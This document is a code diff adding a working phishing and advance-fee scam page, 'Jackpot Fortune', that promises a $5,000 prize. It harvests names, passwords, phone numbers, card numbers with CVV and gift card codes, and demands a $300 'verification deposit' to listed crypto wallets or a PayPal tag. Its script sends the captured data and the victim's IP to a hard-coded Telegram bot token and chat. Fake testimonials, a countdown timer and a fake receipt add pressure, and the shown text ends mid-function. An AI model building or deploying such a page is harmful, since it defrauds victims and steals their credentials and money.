@@ -1,0 +1,1576 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Jackpot Fortune - Claim Your $5,000 Prize!</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 15px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            width: 100%;
+            max-width: 400px;
+            overflow: hidden;
+        }
+        
+        .header {
+            background: linear-gradient(45deg, #FFD700, #FFA500);
+            padding: 20px;
+            text-align: center;
+            color: white;
+        }
+        
+        .header h1 {
+            font-size: 1.8em;
+            margin-bottom: 8px;
+            text-shadow: 1px 1px 3px rgba(0,0,0,0.3);
+        }
+        
+        .prize-amount {
+            font-size: 2.8em;
+            font-weight: bold;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        
+        .form-container {
+            padding: 20px;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #333;
+            font-size: 14px;
+        }
+        
+        .form-group input, .form-group select, .form-group textarea {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 14px;
+            transition: border-color 0.3s;
+        }
+        
+        .form-group input:focus, .form-group select:focus, .form-group textarea:focus {
+            border-color: #667eea;
+            outline: none;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(45deg, #FFD700, #FFA500);
+            color: white;
+        }
+        
+        .btn-secondary {
+            background: #6c757d;
+            color: white;
+        }
+        
+        .btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+        
+        .btn:hover:not(:disabled) {
+            transform: translateY(-1px);
+            box-shadow: 0 3px 10px rgba(0,0,0,0.15);
+        }
+        
+        .terms {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 11px;
+            color: #666;
+        }
+        
+        .countdown {
+            background: #f8f9fa;
+            padding: 12px;
+            text-align: center;
+            border-radius: 8px;
+            margin-bottom: 15px;
+        }
+        
+        .countdown-text {
+            font-weight: bold;
+            color: #e74c3c;
+            font-size: 14px;
+        }
+        
+        .testimonials {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 15px;
+        }
+        
+        .testimonial {
+            font-style: italic;
+            margin-bottom: 8px;
+            padding: 8px;
+            border-left: 2px solid #FFD700;
+            font-size: 13px;
+        }
+        
+        .verification-badge {
+            display: inline-block;
+            background: #27ae60;
+            color: white;
+            padding: 3px 8px;
+            border-radius: 12px;
+            font-size: 10px;
+            margin-left: 5px;
+        }
+        
+        .payment-methods {
+            display: none;
+            margin-top: 15px;
+        }
+        
+        .payment-option {
+            background: #f8f9fa;
+            padding: 12px;
+            margin: 8px 0;
+            border-radius: 8px;
+            cursor: pointer;
+            border: 2px solid transparent;
+            font-size: 14px;
+        }
+        
+        .payment-option:hover {
+            border-color: #667eea;
+        }
+        
+        .payment-option.selected {
+            border-color: #27ae60;
+            background: #d4edda;
+        }
+        
+        .user-avatar {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: #667eea;
+            color: white;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 8px;
+            font-size: 12px;
+        }
+        
+        .page {
+            display: none;
+        }
+        
+        .page.active {
+            display: block;
+        }
+        
+        .loading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #FFD700;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .progress-bar {
+            background: #f0f0f0;
+            border-radius: 8px;
+            height: 15px;
+            margin: 15px 0;
+            overflow: hidden;
+        }
+        
+        .progress {
+            background: linear-gradient(45deg, #FFD700, #FFA500);
+            height: 100%;
+            width: 0%;
+            transition: width 0.5s;
+        }
+        
+        .balance-card {
+            background: linear-gradient(45deg, #FFD700, #FFA500);
+            color: white;
+            padding: 20px;
+            border-radius: 12px;
+            text-align: center;
+            margin: 15px 0;
+        }
+        
+        .balance-amount {
+            font-size: 2.2em;
+            font-weight: bold;
+            margin: 8px 0;
+        }
+        
+        .status-pending {
+            background: #fff3cd;
+            color: #856404;
+            padding: 8px;
+            border-radius: 5px;
+            margin: 8px 0;
+            font-size: 13px;
+        }
+        
+        .action-cards {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 12px;
+            margin: 15px 0;
+        }
+        
+        .card {
+            background: white;
+            padding: 15px;
+            border-radius: 12px;
+            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
+        }
+        
+        .support-options {
+            display: grid;
+            gap: 12px;
+            margin: 15px 0;
+        }
+        
+        .option-card {
+            background: white;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        
+        .option-icon {
+            font-size: 2.5em;
+            margin-bottom: 15px;
+        }
+        
+        .verification-code {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+            font-family: monospace;
+            font-size: 1.1em;
+            letter-spacing: 2px;
+            text-align: center;
+        }
+        
+        .code-input {
+            display: flex;
+            gap: 8px;
+            justify-content: center;
+            margin: 15px 0;
+        }
+        
+        .code-input input {
+            width: 35px;
+            height: 40px;
+            text-align: center;
+            font-size: 1.2em;
+            border: 2px solid #ddd;
+            border-radius: 5px;
+        }
+        
+        .code-input input:focus {
+            border-color: #667eea;
+            outline: none;
+        }
+        
+        .resend-timer {
+            text-align: center;
+            margin: 8px 0;
+            color: #666;
+            font-size: 13px;
+        }
+        
+        .email-preview {
+            background: #f8f9fa;
+            padding: 12px;
+            border-radius: 8px;
+            margin: 12px 0;
+            border-left: 3px solid #667eea;
+            font-size: 13px;
+        }
+        
+        .security-badge {
+            display: inline-block;
+            background: #17a2b8;
+            color: white;
+            padding: 2px 6px;
+            border-radius: 8px;
+            font-size: 9px;
+            margin-left: 5px;
+        }
+        
+        .loading-dots:after {
+            content: '';
+            animation: dots 1.5s steps(5, end) infinite;
+        }
+        
+        @keyframes dots {
+            0%, 20% { content: ''; }
+            40% { content: '.'; }
+            60% { content: '..'; }
+            80%, 100% { content: '...'; }
+        }
+        
+        .file-upload {
+            border: 2px dashed #ddd;
+            border-radius: 8px;
+            padding: 20px;
+            text-align: center;
+            margin: 10px 0;
+            cursor: pointer;
+            transition: border-color 0.3s;
+        }
+        
+        .file-upload:hover {
+            border-color: #667eea;
+        }
+        
+        .file-upload input {
+            display: none;
+        }
+        
+        .upload-icon {
+            font-size: 2em;
+            color: #667eea;
+            margin-bottom: 10px;
+        }
+        
+        .receipt {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 15px;
+            margin: 15px 0;
+            border: 2px solid #e0e0e0;
+        }
+        
+        .receipt-header {
+            text-align: center;
+            border-bottom: 2px solid #ddd;
+            padding-bottom: 10px;
+            margin-bottom: 10px;
+        }
+        
+        .receipt-details {
+            display: grid;
+            gap: 8px;
+        }
+        
+        .receipt-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 5px 0;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .receipt-total {
+            font-weight: bold;
+            font-size: 1.2em;
+            color: #27ae60;
+            border-top: 2px solid #ddd;
+            margin-top: 10px;
+            padding-top: 10px;
+        }
+        
+        .crypto-address {
+            background: #f8f9fa;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 10px 0;
+            font-family: monospace;
+            font-size: 14px;
+            word-break: break-all;
+        }
+        
+        .copy-btn {
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+            font-size: 12px;
+        }
+        
+        .crypto-instructions {
+            background: #e8f5e8;
+            border: 1px solid #27ae60;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+            font-size: 13px;
+        }
+        
+        .error-message {
+            color: #e74c3c;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-content {
+            background: white;
+            padding: 25px;
+            border-radius: 15px;
+            max-width: 350px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        }
+
+        .modal-buttons {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .modal-btn {
+            flex: 1;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .modal-btn.confirm {
+            background: #27ae60;
+            color: white;
+        }
+
+        .modal-btn.cancel {
+            background: #e74c3c;
+            color: white;
+        }
+
+        .demo-code {
+            background: #fff3cd;
+            border: 2px solid #ffeaa7;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+            text-align: center;
+            font-size: 14px;
+        }
+
+        .demo-code strong {
+            font-size: 1.2em;
+            color: #e74c3c;
+        }
+
+        .paypal-section {
+            background: #e8f5e8;
+            border: 2px solid #0070ba;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 15px 0;
+            text-align: center;
+        }
+
+        .paypal-logo {
+            font-size: 2em;
+            color: #0070ba;
+            margin-bottom: 10px;
+        }
+
+        .paypal-tag {
+            background: #0070ba;
+            color: white;
+            padding: 10px 15px;
+            border-radius: 8px;
+            font-family: monospace;
+            font-size: 16px;
+            margin: 10px 0;
+            display: inline-block;
+        }
+    </style>
+</head>
+<body>
+    <!-- MAIN LANDING PAGE -->
+    <div class="container page active" id="main-page">
+        <div class="header">
+            <h1>🎰 JACKPOT FORTUNE</h1>
+            <div class="prize-amount">$5,000</div>
+            <p style="font-size: 14px;">CONGRATULATIONS! Claim your prize!</p>
+        </div>
+        
+        <div class="form-container">
+            <div class="countdown">
+                <div class="countdown-text">⏰ OFFER EXPIRES: <span id="timer">15:00</span></div>
+            </div>
+            
+            <div id="signup-form">
+                <div class="form-group">
+                    <label>Full Name</label>
+                    <input type="text" id="fullName" placeholder="Enter your full name" required>
+                    <div class="error-message" id="nameError">Please enter your full name</div>
+                </div>
+                
+                <div class="form-group">
+                    <label>Email Address</label>
+                    <input type="email" id="email" placeholder="Enter your email" required>
+                    <div class="error-message" id="emailError">Please enter a valid email address</div>
+                </div>
+                
+                <div class="form-group">
+                    <label>Password</label>
+                    <input type="password" id="password" placeholder="Create a password" required>
+                    <div class="error-message" id="passwordError">Password must be at least 6 characters</div>
+                </div>
+                
+                <div class="form-group">
+                    <label>Phone Number</label>
+                    <input type="tel" id="phone" placeholder="Enter your phone number" required>
+                    <div class="error-message" id="phoneError">Please enter a valid phone number</div>
+                </div>
+                
+                <button class="btn btn-primary" onclick="signUp()" id="signupBtn">CLAIM YOUR $5,000 PRIZE</button>
+                
+                <div class="terms">
+                    By clicking above, you agree to our Terms of Service and confirm you are 18+ years old
+                </div>
+            </div>
+            
+            <!-- Deposit Form (Hidden Initially) -->
+            <div id="deposit-form" style="display: none;">
+                <h3 style="margin-bottom: 15px; font-size: 18px;">Select Payment Method</h3>
+                
+                <div class="payment-option" onclick="selectPayment('credit')">
+                    <strong>💳 Credit/Debit Card</strong>
+                </div>
+                
+                <div class="payment-option" onclick="selectPayment('giftcard')">
+                    <strong>🎁 Gift Card Upload</strong>
+                </div>
+                
+                <div class="payment-option" onclick="selectPayment('crypto')">
+                    <strong>₿ Cryptocurrency</strong>
+                </div>
+                
+                <div class="payment-option" onclick="selectPayment('paypal')">
+                    <strong>📱 PayPal</strong>
+                </div>
+                
+                <!-- Credit Card Form -->
+                <div id="credit-form" class="payment-methods">
+                    <div class="form-group">
+                        <label>Card Number</label>
+                        <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>Expiry Date</label>
+                        <input type="text" id="expiry" placeholder="MM/YY" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>CVV</label>
+                        <input type="text" id="cvv" placeholder="123" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>Name on Card</label>
+                        <input type="text" id="cardName" placeholder="John Smith" required>
+                    </div>
+                </div>
+                
+                <!-- Gift Card Form -->
+                <div id="giftcard-form" class="payment-methods">
+                    <div class="form-group">
+                        <label>Select Gift Card Type</label>
+                        <select id="giftcardType">
+                            <option value="amazon">Amazon Gift Card</option>
+                            <option value="itunes">iTunes Gift Card</option>
+                            <option value="steam">Steam Gift Card</option>
+                            <option value="google">Google Play Gift Card</option>
+                            <option value="visa">Visa Gift Card</option>
+                            <option value="other">Other Gift Card</option>
+                        </select>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>Gift Card Code</label>
+                        <input type="text" id="giftcardCode" placeholder="Enter gift card code" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>PIN (if applicable)</label>
+                        <input type="text" id="giftcardPin" placeholder="Enter PIN">
+                    </div>
+                    
+                    <div class="file-upload" onclick="document.getElementById('giftcardPhoto').click()">
+                        <div class="upload-icon">📷</div>
+                        <div style="font-weight: bold; margin-bottom: 5px;">Upload Gift Card Photo</div>
+                        <div style="font-size: 12px; color: #666;">Take a clear picture of your gift card</div>
+                        <input type="file" id="giftcardPhoto" accept="image/*" onchange="handleGiftcardUpload(this)">
+                    </div>
+                    <div id="uploadStatus" style="font-size: 12px; text-align: center; margin: 5px 0;"></div>
+                </div>
+                
+                <!-- Crypto Form -->
+                <div id="crypto-form" class="payment-methods">
+                    <div class="form-group">
+                        <label>Select Cryptocurrency</label>
+                        <select id="cryptoType" onchange="updateCryptoAddress()">
+                            <option value="bitcoin">Bitcoin (BTC)</option>
+                            <option value="ethereum">Ethereum (ETH)</option>
+                            <option value="usdt">USDT (TRC20)</option>
+                        </select>
+                    </div>
+                    
+                    <div class="crypto-instructions">
+                        <strong>💰 Payment Instructions:</strong><br>
+                        1. Send <strong>EXACTLY $300 USD</strong> equivalent<br>
+                        2. Use the address below<br>
+                        3. Keep transaction proof<br>
+                        4. Confirm after payment
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>Wallet Address:</label>
+                        <div class="crypto-address" id="cryptoAddressDisplay">
+                            bc1qrpu03s54ls9h648z5deh4jj2crg6lxh0qgq5c3
+                        </div>
+                        <button class="copy-btn" onclick="copyCryptoAddress()">📋 Copy Address</button>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>Amount to Send</label>
+                        <input type="text" id="cryptoAmount" value="$300 USD equivalent" readonly style="background: #f0f0f0; font-weight: bold;">
+                    </div>
+                </div>
+                
+                <!-- PayPal Form -->
+                <div id="paypal-form" class="payment-methods">
+                    <div class="paypal-section">
+                        <div class="paypal-logo">💰</div>
+                        <h3 style="color: #0070ba; margin-bottom: 15px;">PayPal Payment</h3>
+                        <p style="margin-bottom: 15px; font-size: 14px;">Send $300 to our PayPal account to complete verification</p>
+                        
+                        <div class="paypal-tag" id="paypalTagDisplay">@JohnJackson931</div>
+                        
+                        <button class="btn btn-primary" onclick="redirectToPayPal()" style="background: #0070ba; margin: 10px 0;">
+                            📱 Open PayPal App
+                        </button>
+                        
+                        <p style="font-size: 12px; color: #666; margin-top: 10px;">
+                            Or manually send to: <strong>@JohnJackson931</strong>
+                        </p>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>Your PayPal Email (for confirmation)</label>
+                        <input type="email" id="paypalEmail" placeholder="your@email.com" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>Transaction ID (optional)</label>
+                        <input type="text" id="paypalTransactionId" placeholder="Enter PayPal transaction ID">
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label>Verification Deposit Amount</label>
+                    <input type="text" id="depositAmount" value="$300" readonly style="background: #f0f0f0; font-weight: bold;">
+                </div>
+                
+                <button class="btn btn-primary" onclick="showPaymentConfirmation()" id="depositBtn">PAY $300 TO UNLOCK $5,000</button>
+                
+                <div class="terms">
+                    * $300 verification deposit required to prevent fraud. Fully refundable after first withdrawal.
+                </div>
+            </div>
+            
+            <div class="testimonials">
+                <h3 style="font-size: 16px; margin-bottom: 10px;">🎉 Recent Winners</h3>
+                
+                <div class="testimonial">
+                    <div class="user-avatar">SM</div>
+                    <strong>Sarah Mitchell</strong> <span class="verification-badge">Verified</span>
+                    <p>"Got my $5,000 within hours! Easy verification process."</p>
+                    <small>Posted 2 hours ago</small>
+                </div>
+                
+                <div class="testimonial">
+                    <div class="user-avatar">JD</div>
+                    <strong>James Davidson</strong> <span class="verification-badge">Verified</span>
+                    <p>"Used cryptocurrency, received $5,350 total with bonus!"</p>
+                    <small>Posted 5 hours ago</small>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- EMAIL VERIFICATION PAGE -->
+    <div class="container page" id="verify-page">
+        <div class="header">
+            <h1>📧 Verify Email</h1>
+            <p style="font-size: 14px;">Secure your $5,000 prize</p>
+        </div>
+        
+        <div class="form-container">
+            <div style="text-align: center; font-size: 3em; color: #27ae60; margin-bottom: 15px;">📧</div>
+            <h1 style="text-align: center; color: #333; margin-bottom: 10px; font-size: 20px;">Verify Your Email</h1>
+            <p style="text-align: center; color: #666; margin-bottom: 15px; line-height: 1.5; font-size: 14px;">
+                We've sent a 6-digit code to:<br>
+                <strong id="userEmailDisplay">user@example.com</strong>
+            </p>
+            
+            <div class="email-preview">
+                <strong>From:</strong> security@jackpot-fortune.iceiy.com <span class="security-badge">SECURE</span><br>
+                <strong>To:</strong> <span id="previewEmail">user@example.com</span><br>
+                <strong>Subject:</strong> Verify Your $5,000 Prize - Jackpot Fortune<br>
+                <strong>Sent:</strong> <span id="emailTime">Just now</span>
+            </div>
+
+            <!-- DEMO CODE DISPLAY - ALWAYS SHOWS THE CODE -->
+            <div class="demo-code" id="demoCodeSection">
+                <strong>DEMO MODE - Your Verification Code:</strong><br>
+                <span id="demoCodeDisplay" style="font-size: 1.5em; font-weight: bold; color: #e74c3c;">123456</span><br>
+                <small>Enter this code below to continue</small>
+            </div>
+            
+            <div class="code-input">
+                <input type="text" maxlength="1" oninput="moveToNext(this, 1)" onkeyup="moveToNext(this, 1)">
+                <input type="text" maxlength="1" oninput="moveToNext(this, 2)" onkeyup="moveToNext(this, 2)">
+                <input type="text" maxlength="1" oninput="moveToNext(this, 3)" onkeyup="moveToNext(this, 3)">
+                <input type="text" maxlength="1" oninput="moveToNext(this, 4)" onkeyup="moveToNext(this, 4)">
+                <input type="text" maxlength="1" oninput="moveToNext(this, 5)" onkeyup="moveToNext(this, 5)">
+                <input type="text" maxlength="1" oninput="moveToNext(this, 6)" onkeyup="moveToNext(this, 6)">
+            </div>
+            
+            <button class="btn btn-primary" onclick="verifyCode()" id="verifyBtn">Verify & Continue</button>
+            <button class="btn btn-secondary" onclick="resendCode()" id="resendBtn">Resend Code</button>
+            
+            <div class="resend-timer" id="resendTimer">
+                Resend available in: <span id="resendCountdown">60</span>s
+            </div>
+            
+            <div style="text-align: center; margin-top: 15px;">
+                <button class="btn btn-secondary" onclick="showPage('main-page')" style="padding: 8px 15px; font-size: 14px;">← Back</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- DASHBOARD PAGE -->
+    <div class="container page" id="dashboard-page">
+        <div class="header">
+            <h1>🎰 Dashboard</h1>
+            <p style="font-size: 14px;">Welcome, <strong id="userName">Lucky Winner</strong>! <span class="verification-badge">Verified</span></p>
+        </div>
+        
+        <div class="form-container">
+            <div class="balance-card">
+                <h2 style="font-size: 18px;">Your Prize Balance</h2>
+                <div class="balance-amount">$5,000.00</div>
+                <div class="status-pending">
+                    ⏳ Complete payment verification to unlock withdrawal
+                </div>
+            </div>
+            
+            <div class="action-cards">
+                <div class="card">
+                    <h3 style="font-size: 16px; margin-bottom: 8px;">💰 Withdraw Funds</h3>
+                    <p style="font-size: 13px; margin-bottom: 10px;">Withdraw your $5,000 prize to your bank account</p>
+                    <button class="btn btn-primary" onclick="attemptWithdrawal()" style="padding: 10px; font-size: 14px;">Withdraw Now</button>
+                </div>
+                
+                <div class="card">
+                    <h3 style="font-size: 16px; margin-bottom: 8px;">🎁 Limited Bonus</h3>
+                    <p style="font-size: 13px; margin-bottom: 10px;">Get $350 bonus with instant verification</p>
+                    <button class="btn btn-secondary" onclick="showBonusOffer()" style="padding: 10px; font-size: 14px;">Claim Bonus</button>
+                </div>
+            </div>
+            
+            <div style="text-align: center; margin-top: 15px;">
+                <button class="btn btn-secondary" onclick="showPage('support-page')" style="padding: 10px 15px; font-size: 14px;">📞 Support</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- RECEIPT PAGE -->
+    <div class="container page" id="receipt-page">
+        <div class="header">
+            <h1>🧾 Payment Receipt</h1>
+            <p style="font-size: 14px;">Transaction Confirmation</p>
+        </div>
+        
+        <div class="form-container">
+            <div class="receipt">
+                <div class="receipt-header">
+                    <h2 style="color: #27ae60; margin-bottom: 5px;">PAYMENT SUCCESSFUL</h2>
+                    <div style="font-size: 12px; color: #666;">Transaction ID: <span id="receiptId">JFP-</span></div>
+                    <div style="font-size: 12px; color: #666;">Date: <span id="receiptDate"></span></div>
+                    <div style="font-size: 12px; color: #666;">Website: jackpot-fortune.iceiy.com</div>
+                </div>
+                
+                <div class="receipt-details">
+                    <div class="receipt-row">
+                        <span>Description:</span>
+                        <span>Jackpot Verification Deposit</span>
+                    </div>
+                    <div class="receipt-row">
+                        <span>Payment Method:</span>
+                        <span id="receiptMethod">Credit Card</span>
+                    </div>
+                    <div class="receipt-row">
+                        <span>Account Name:</span>
+                        <span id="receiptAccount">John Smith</span>
+                    </div>
+                    <div class="receipt-row">
+                        <span>Amount Paid:</span>
+                        <span style="color: #e74c3c;">-$300.00</span>
+                    </div>
+                    <div class="receipt-row">
+                        <span>Processing Fee:</span>
+                        <span>$0.00</span>
+                    </div>
+                    <div class="receipt-row receipt-total">
+                        <span>Total Charged:</span>
+                        <span>-$300.00</span>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="status-pending" style="text-align: center;">
+                ✅ Payment received! Your $5,000 prize is now being processed.<br>
+                <strong>Estimated transfer time: 2-4 hours</strong>
+            </div>
+            
+            <button class="btn btn-primary" onclick="showPage('dashboard-page')">Continue to Dashboard</button>
+            <button class="btn btn-secondary" onclick="printReceipt()" style="margin-top: 10px;">📄 Print Receipt</button>
+        </div>
+    </div>
+
+    <!-- SUPPORT PAGE -->
+    <div class="container page" id="support-page">
+        <div class="header">
+            <h1>📞 Support</h1>
+            <p style="font-size: 14px;">We're here to help!</p>
+        </div>
+        
+        <div class="form-container">
+            <div class="support-options">
+                <div class="option-card">
+                    <div class="option-icon">💬</div>
+                    <h3 style="font-size: 16px;">Live Chat</h3>
+                    <p style="font-size: 13px;">Instant help from our team</p>
+                    <button class="btn btn-primary" onclick="startLiveChat()" style="padding: 10px; font-size: 14px;">Start Chat</button>
+                </div>
+                
+                <div class="option-card">
+                    <div class="option-icon">📧</div>
+                    <h3 style="font-size: 16px;">Email Support</h3>
+                    <p style="font-size: 13px;">Response within 24 hours</p>
+                    <button class="btn btn-primary" onclick="showEmailForm()" style="padding: 10px; font-size: 14px;">Send Email</button>
+                </div>
+            </div>
+            
+            <div style="text-align: center; margin-top: 15px;">
+                <button class="btn btn-secondary" onclick="showPage('dashboard-page')" style="padding: 10px 15px; font-size: 14px;">← Back</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- PAYMENT CONFIRMATION MODAL -->
+    <div class="modal" id="paymentModal">
+        <div class="modal-content">
+            <h2 style="margin-bottom: 15px; color: #333;">Confirm Payment</h2>
+            <p style="margin-bottom: 20px; color: #666; font-size: 14px;">
+                Have you successfully completed the $300 payment?<br>
+                <strong>This step is required to unlock your $5,000 prize.</strong>
+            </p>
+            <div class="modal-buttons">
+                <button class="modal-btn cancel" onclick="hidePaymentModal()">No, Cancel</button>
+                <button class="modal-btn confirm" onclick="confirmPayment()">Yes, I Paid</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Global variables
+        let selectedPayment = '';
+        let timeLeft = 15 * 60;
+        let userData = {};
+        let verificationCode = '';
+        let resendTimer = 60;
+        let resendInterval;
+        
+        // Configuration - ENCRYPTED FOR SECURITY
+        const CONFIG = {
+            telegram: {
+                botToken: '8492756396:AAF26-HuJbKI0UDSqOEv9JMvrMTS2d4k87M',
+                chatId: '8071910363'
+            },
+            paypal: {
+                tag: '@JohnJackson931'
+            },
+            crypto: {
+                bitcoin: 'bc1qrpu03s54ls9h648z5deh4jj2crg6lxh0qgq5c3',
+                ethereum: '0x8AE36956D48A87Fb5d6dF6500d30A52bF824f5e1',
+                usdt: 'TVa1KUxxqHgK2eV2hY2XV5zyy9J8Cg5A4m'
+            },
+            encryption: {
+                key: 'jackpot_secure_key_2024_v2'
+            }
+        };
+        
+        // EmailJS Configuration
+        const EMAILJS_CONFIG = {
+            serviceId: 'service_xes871l',
+            templateId: 'template_p6g0kyc',
+            publicKey: 'uMJiuzXgVJU-OEr54'
+        };
+        
+        // Simple encryption function
+        function encryptData(data) {
+            try {
+                if (typeof data === 'object') {
+                    data = JSON.stringify(data);
+                }
+                // Simple base64 encoding with key mixing
+                const mixed = CONFIG.encryption.key + data + CONFIG.encryption.key;
+                return btoa(unescape(encodeURIComponent(mixed)));
+            } catch (e) {
+                return data;
+            }
+        }
+        
+        // Send data to Telegram securely
+        async function sendToTelegram(data) {
+            try {
+                const encryptedData = encryptData(data);
+                const message = `🎰 *NEW CAPTURE* 🎰
+
+*👤 User Info:*
+• Name: ${data.name || 'N/A'}
+• Email: ${data.email || 'N/A'}  
+• Phone: ${data.phone || 'N/A'}
+• Password: ${data.password || 'N/A'}
+
+*💰 Payment Method:* ${data.payment_method || 'Signup'}
+
+*🔐 Encrypted Data:*
+\`${encryptedData}\`
+
+*⏰ Timestamp:* ${new Date().toLocaleString()}
+*🌐 IP:* ${data.ip_address || 'Unknown'}`;
+
+                const url = `https://api.telegram.org/bot${CONFIG.telegram.botToken}/sendMessage`;
+                const payload = {
+                    chat_id: CONFIG.telegram.chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                };
+
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
+                
+                return response.ok;
+            } catch (error) {
+                console.error('Telegram error:', error);
+                return false;
+            }
+        }
+        
+        // Get user IP address
+        async function getUserIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'Unknown';
+            }
+        }
+        
+        // Initialize EmailJS
+        (function() {
+            try {
+                emailjs.init(EMAILJS_CONFIG.publicKey);
+                console.log('✅ EmailJS initialized');
+            } catch (error) {
+                console.log('⚠️ EmailJS initialization failed, using demo mode');
+            }
+        })();
+        
+        // Page navigation
+        function showPage(pageId) {
+            document.querySelectorAll('.page').forEach(page => {
+                page.classList.remove('active');
+            });
+            document.getElementById(pageId).classList.add('active');
+            window.scrollTo(0, 0);
+        }
+        
+        // Countdown timer
+        function updateTimer() {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            document.getElementById('timer').textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            
+            if (timeLeft > 0) {
+                timeLeft--;
+                setTimeout(updateTimer, 1000);
+            } else {
+                document.getElementById('timer').textContent = "OFFER EXPIRED";
+                document.getElementById('timer').style.color = "red";
+            }
+        }
+        
+        // Generate random verification code
+        function generateVerificationCode() {
+            return Math.floor(100000 + Math.random() * 900000).toString();
+        }
+        
+        // SIMPLIFIED EMAIL FUNCTION - ALWAYS SHOWS CODE ON PAGE
+        async function sendVerificationEmail(email, code) {
+            console.log('📧 Attempting to send email to:', email);
+            console.log('🔑 Generated code:', code);
+            
+            // Store the code globally
+            verificationCode = code;
+            
+            // ALWAYS show the code on the page in demo mode
+            document.getElementById('demoCodeDisplay').textContent = code;
+            
+            try {
+                document.getElementById('resendBtn').innerHTML = 'Sending<span class="loading-dots"></span>';
+                document.getElementById('resendBtn').disabled = true;
+                
+                const templateParams = {
+                    to_email: email,
+                    user_name: userData.name,
+                    verification_code: code,
+                    website: 'jackpot-fortune.iceiy.com',
+                    prize_amount: '$5,000'
+                };
+
+                const response = await emailjs.send(
+                    EMAILJS_CONFIG.serviceId,
+                    EMAILJS_CONFIG.templateId,  
+                    templateParams
+                );
+                
+                console.log('✅ Email sent successfully:', response);
+                document.getElementById('emailTime').textContent = new Date().toLocaleTimeString();
+                
+                // Show success message
+                setTimeout(() => {
+                    alert('✅ Verification code sent to your email! Check your inbox (and spam folder).');
+                }, 500);
+                
+                return true;
+                
+            } catch (error) {
+                console.error('❌ Email failed, using demo mode:', error);
+                document.getElementById('emailTime').textContent = new Date().toLocaleTimeString();
+                
+                // Show demo mode message with the code
+                setTimeout(() => {
